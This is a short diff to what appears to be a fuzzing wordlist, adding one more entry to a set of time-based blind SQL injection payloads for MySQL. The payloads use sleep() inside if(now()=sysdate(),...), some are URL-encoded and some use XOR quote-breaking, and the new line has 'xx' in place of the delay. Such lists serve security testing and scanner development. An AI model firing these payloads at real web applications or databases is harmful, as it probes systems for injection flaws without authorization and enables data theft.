@@ -1,3 +1,4 @@
 if(now()=sysdate()%2Csleep(8)%2C0)
 0"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z
 0\"XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z
+if(now()=sysdate(),sleep(xx),0)
